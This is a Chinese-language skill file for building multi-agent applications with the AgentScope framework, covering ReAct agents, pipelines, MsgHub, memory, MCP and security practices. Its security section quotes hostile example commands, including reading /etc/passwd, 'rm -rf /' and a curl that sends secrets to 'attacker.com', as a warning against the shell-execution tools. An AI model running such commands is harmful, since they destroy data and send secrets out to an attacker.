---
name: agentscope
description: 使用AgentScope框架构建生产就绪的多智能体系统。当用户想要创建AI智能体、多智能体工作流或分布式智能体应用程序时，请使用此技能。提供ReActAgent、MsgHub、Pipelines、MCP集成、内存管理和容错智能体系统的模式。
---

# AgentScope 技能

使用阿里巴巴的AgentScope框架构建生产就绪的多智能体应用程序。

## 何时使用此技能

当用户想要：
- 创建AI智能体（ReActAgent、DialogAgent、自定义智能体）
- 构建多智能体工作流和编排
- 集成MCP（模型上下文协议）工具
- 实现内存系统（短期、长期）
- 部署分布式多智能体系统
- 使用AgentScope的管道、MsgHub或规划功能

## 快速入门模式

```python
import asyncio
import os
from agentscope.agent import ReActAgent
from agentscope.model import DashScopeChatModel
from agentscope.formatter import DashScopeChatFormatter
from agentscope.memory import InMemoryMemory
from agentscope.tool import Toolkit
# 安全性：不要在生产中使用execute_python_code或execute_shell_command
# 它们允许任意代码执行

async def build_agent():
    toolkit = Toolkit()

    # 安全性：定义安全的自定义工具，而不是使用execute_python_code
    def calculator(expression: str) -> float:
        """安全地评估基本数学表达式。"""
        import ast
        import operator
        ops = {
            ast.Add: operator.add,
            ast.Sub: operator.sub,
            ast.Mult: operator.mul,
            ast.Div: operator.truediv
        }
        tree = ast.parse(expression, mode='eval')
        def safe_eval(node):
            if isinstance(node, ast.Num):
                return node.n
            elif isinstance(node, ast.BinOp):
                return ops[type(node.op)](
                    safe_eval(node.left),
                    safe_eval(node.right)
                )
            raise ValueError("Unsupported operation")
        return safe_eval(tree.body)

    toolkit.register_tool_function(calculator)

    agent = ReActAgent(
        name="Assistant",
        sys_prompt="You are a helpful AI assistant.",
        model=DashScopeChatModel(
            model_name="qwen-max",
            api_key=os.environ["DASHSCOPE_API_KEY"],
            stream=True
        ),
        memory=InMemoryMemory(),
        formatter=DashScopeChatFormatter(),
        toolkit=toolkit
    )

    return agent
```

## 核心模式

### 模式一：简单对话型Agent
**用例**：聊天机器人、问答系统、简单助手

```python
from agentscope.agent import DialogAgent

agent = DialogAgent(
    name="ChatBot",
    sys_prompt="You are a friendly conversational assistant.",
    model=DashScopeChatModel(model_name="qwen-max", api_key=api_key),
    memory=InMemoryMemory()
)

response = await agent(Msg(name="user", content="Hello!", role="user"))
```

**参考**：请参阅 `references/agents.md` 了解所有Agent类型。

### 模式二：使用工具的Agent (ReAct)
**用例**：任务自动化、代码执行、网页浏览

```python
from agentscope.agent import ReActAgent
from agentscope.tool import Toolkit

toolkit = Toolkit()

# 安全警告：切勿在生产环境中使用 execute_shell_command 或 execute_python_code！
# 它们允许执行任意代码。替代方案：
# 1. 定义具体、安全的工具函数
# 2. 使用来自可信来源的 MCP 工具
# 3. 实现输入验证和沙箱化

def safe_file_read(filepath: str) -> str:
    """带路径验证的文件读取。"""
    import os
    safe_dir = "/allowed/directory"
    abs_path = os.path.abspath(filepath)
    if not abs_path.startswith(safe_dir):
        raise ValueError("Access denied: path outside allowed directory")
    with open(abs_path, 'r') as f:
        return f.read()

toolkit.register_tool_function(safe_file_read)

agent = ReActAgent(
    name="Coder",
    sys_prompt="You help with coding tasks. Use tools when needed.",
    model=model,
    memory=InMemoryMemory(),
    formatter=DashScopeChatFormatter(),
    toolkit=toolkit,
    max_iters=10
)
```
**参考**：请参阅 `references/tools-mcp.md` 了解自定义工具和MCP集成。

### 模式三：多Agent管道
**用例**：顺序工作流、并行处理

```python
from agentscope.pipeline import sequential_pipeline, fanout_pipeline

# 顺序：agent1 -> agent2 -> agent3
result = await sequential_pipeline(
    agents=[researcher, analyzer, writer],
    msg=initial_msg
)

# 并行：所有agent处理相同的输入
results = await fanout_pipeline(
    agents=[sentiment_agent, entity_agent, summary_agent],
    msg=input_msg
)
```

**参考**：请参阅 `references/pipelines.md` 了解编排模式。

### 模式四：多Agent对话 (MsgHub)
**用例**：小组讨论、协作型Agent

```python
from agentscope.hub import MsgHub

async with MsgHub(
    participants=[agent1, agent2, agent3],
    announcement=Msg("user", "Discuss the topic...", "user")
) as hub:
    await agent1()  # 广播给其他Agent
    await agent2()  # 广播给其他Agent
    await agent3()  # 广播给其他Agent
```

### 模式五：自定义Agent
**用例**：专门行为、自定义逻辑

```python
from agentscope.agent import AgentBase
from agentscope.message import Msg

class MyAgent(AgentBase):
    def __init__(self, name, model, **kwargs):
        super().__init__(name=name, **kwargs)
        self.model = model

    async def __call__(self, msg: Msg = None) -> Msg:
        if msg:
            self.memory.add(msg)

        response = await self.model(self.memory.get_memory())

        output = Msg(
            name=self.name,
            content=response.content,
            role="assistant"
        )
        self.memory.add(output)
        return output
```

**参考**：请参阅 `references/agents.md` 了解自定义Agent模式。

## 模型配置

### 支持的提供商

```python
from agentscope.model import (
    DashScopeChatModel,   # Qwen 模型
    OpenAIChatModel,       # GPT 模型
    AnthropicChatModel,    # Claude 模型
)

# 将格式化器与模型匹配
from agentscope.formatter import (
    DashScopeChatFormatter,
    OpenAIChatFormatter,
    AnthropicChatFormatter,
)

# 示例：DashScope (Qwen)
agent = ReActAgent(
    model=DashScopeChatModel(
        model_name="qwen-max",
        api_key=os.environ["DASHSCOPE_API_KEY"],
        stream=True
    ),
    formatter=DashScopeChatFormatter(),  # 匹配！
    ...
)
```

**参考**：请参阅 `references/api_reference.md` 了解所有模型包装器。

## 内存系统

### 短期内存（对话历史）

```python
from agentscope.memory import InMemoryMemory

memory = InMemoryMemory(
    max_messages=100,    # 按数量限制
    summarization=True   # 自动总结旧消息
)
```

### 长期内存（跨会话）

```python
from agentscope.memory import ReMeMemory

ltm = ReMeMemory(
    storage_path="./memory_store",
    embedding_model="text-embedding-v2"
)

# 搜索记忆
results = await ltm.search(
    query="What did we discuss about Python?",
    top_k=5
)
```

**参考**：请参阅 `references/memory.md` 了解内存模式。

## MCP 集成

连接到模型上下文协议（MCP）服务器以获得扩展的工具生态系统：

```python
from agentscope.tool import MCPToolkit

# StdIO 传输（本地服务器）
mcp_toolkit = MCPToolkit(
    server_name="filesystem",
    transport="stdio",
    command="python",
    args=["mcp_server.py"]
)

await mcp_toolkit.initialize()
tools = await mcp_toolkit.list_tools()

# 与Agent一起使用
agent = ReActAgent(name="agent", toolkit=mcp_toolkit, ...)
```

**参考**：请参阅 `references/tools-mcp.md` 了解 MCP 模式。

## 分布式部署

将本地Agent转换为分布式部署：

```python
from agentscope.agent import to_dist_agent
import ray

ray.init(address="auto")  # 连接到集群

local_agent = ReActAgent(name="worker", ...)
distributed_agent = to_dist_agent(local_agent)

# 使用方式相同 - 框架处理分发
result = await distributed_agent(msg)
```

**参考**：请参阅 `references/distributed.md` 了解部署模式。

## 三阶段应用模式

生产应用程序遵循此结构：

```python
from agentscope.app import AgentApp

class MyApp(AgentApp):
    async def init(self):
        """阶段一：初始化资源"""
        self.agent = ReActAgent(...)
        self.toolkit = Toolkit()

    async def query(self, user_input: str):
        """阶段二：处理请求"""
        msg = Msg(name="user", content=user_input, role="user")
        return await self.agent(msg)

    async def shutdown(self):
        """阶段三：清理资源"""
        await self.cleanup()
```

## 参考文件

加载这些参考文件以获取详细信息：

| 文件 | 用途 |
|------|---------|
| `references/architecture.md` | 分层架构，消息流 |
| `references/agents.md` | Agent类型、配置、自定义Agent |
| `references/tools-mcp.md` | 工具包、自定义工具、MCP集成 |
| `references/memory.md` | 短期、长期、ReMe、Mem0 |
| `references/pipelines.md` | 顺序、扇出、规划、路由 |
| `references/distributed.md` | 基于Actor的部署、扩展 |
| `references/api_reference.md` | 模型包装器、格式化器、API |

## 示例脚本

请参阅 `scripts/` 目录中的可运行示例：

- `example.py`: 带工具的基本ReActAgent
- scripts文件夹中的其他示例

## 架构图

```
┌─────────────────────────────────────────────────────────┐
│                    应用层 (Application Layer)                │
│         (AgentApp, Workflows, User Interfaces)           │
├─────────────────────────────────────────────────────────┤
│                      Agent层 (Agent Layer)                     │
│    (ReActAgent, DialogAgent, UserAgent, Custom)          │
├─────────────────────────────────────────────────────────┤
│                  通信层 (Communication Layer)                │
│        (MsgHub, Messages, Pipelines, Planning)           │
├─────────────────────────────────────────────────────────┤
│                  基础设施层 (Infrastructure Layer)               │
│  (Model Wrappers, Memory, Tools, MCP, Fault Tolerance)   │
└─────────────────────────────────────────────────────────┘
```

## 安全考虑

⚠️ **严重安全警告**

### 危险的内置工具（切勿在生产中使用）

AgentScope提供了两个带来严重安全风险的内置工具：

| 工具 | 风险 | 建议 |
|------|------|----------------|
| `execute_shell_command` | **严重**：任意shell命令执行 | 切勿在生产中使用 |
| `execute_python_code` | **严重**：任意Python代码执行 | 切勿在生产中使用 |

### 为什么这些工具很危险

```python
# ❌ 危险 - 不要使用
toolkit.register_tool_function(execute_shell_command)
toolkit.register_tool_function(execute_python_code)

# 攻击者可以：
# - 读取敏感文件: execute_shell_command("cat /etc/passwd")
# - 删除数据: execute_python_code("import os; os.system('rm -rf /')")
# - 窃取数据: execute_shell_command("curl attacker.com/steal?data=$(cat secret)")
```

### 安全的替代方案

不要使用危险的内置工具，而是实现具体、经过验证的操作：

```python
# ✅ 安全 - 带验证的具体工具
def read_allowed_file(filename: str) -> str:
    """从允许的目录中读取文件并进行验证。"""
    import os

    # 验证文件名（无路径遍历）
    if ".." in filename or "/" in filename or "\\" in filename:
        raise ValueError("Invalid filename")

    # 限制在允许的目录
    allowed_dir = "/data/allowed"
    filepath = os.path.join(allowed_dir, filename)

    # 验证扩展名
    if not filename.endswith((".txt", ".json", ".md")):
        raise ValueError("Unsupported file type")

    with open(filepath, 'r') as f:
        return f.read()

toolkit.register_tool_function(read_allowed_file)
```

### 安全最佳实践

1.  **最小权限原则**：仅提供Agent需要的工具
2.  **输入验证**：在处理之前验证所有输入
3.  **沙箱化敏感操作**：使用容器、受限环境
4.  **审计工具使用**：记录所有工具调用
5.  **使用MCP工具**：优先使用经过良好审计的MCP服务器工具，而不是自定义实现
6.  **切勿暴露Shell/代码执行**：即使有“验证”，这些也太危险了

### 缓解间接提示注入

当使用从外部来源（`web_search`、`web_fetch`）获取内容的工具时，请注意间接提示注入的风险。网页上的恶意内容可能会试图诱骗智能体执行意外操作。

**缓解策略：**
- **持怀疑态度的智能体提示**：指示您的智能体对网页内容中的指令持怀疑态度，并在执行敏感操作前寻求确认。
- **用户确认**：对于关键操作（例如，进行购买、发送电子邮件），在执行前实施用户确认步骤。
- **限制性工具权限**：限制可供智能体使用的工具的权限。不要给浏览网页的智能体执行shell命令的能力。

### 报告：套接字安全分析

一项安全审计在模板代码中发现了严重漏洞：

- **发现1**：`execute_shell_command` 允许任意命令执行
- **发现2**：`execute_python_code` 允许任意代码执行
- **状态**：所有模板已更新为使用安全替代方案

有关详细的安全指南，请参阅 `references/tools-mcp.md`。

## 最佳实践

1.  调用Agent时**始终使用async/await**
2.  **将格式化器与模型匹配**以获得正确的消格式
3.  为ReActAgent**设置max_iters**以防止无限循环
4.  **使用内存**来维护对话上下文
5.  在将工具包传递给Agent**之前注册工具**
6.  **优先使用MCP工具**进行外部集成
7.  对依赖步骤**使用sequential_pipeline**
8.  对并行独立分析**使用fanout_pipeline**

## 资源

- **GitHub**: https://github.com/agentscope-ai/agentscope
- **文档**: https://doc.agentscope.io
- **PyPI**: `pip install agentscope`
- **ReMe Memory**: https://github.com/agentscope-ai/ReMe
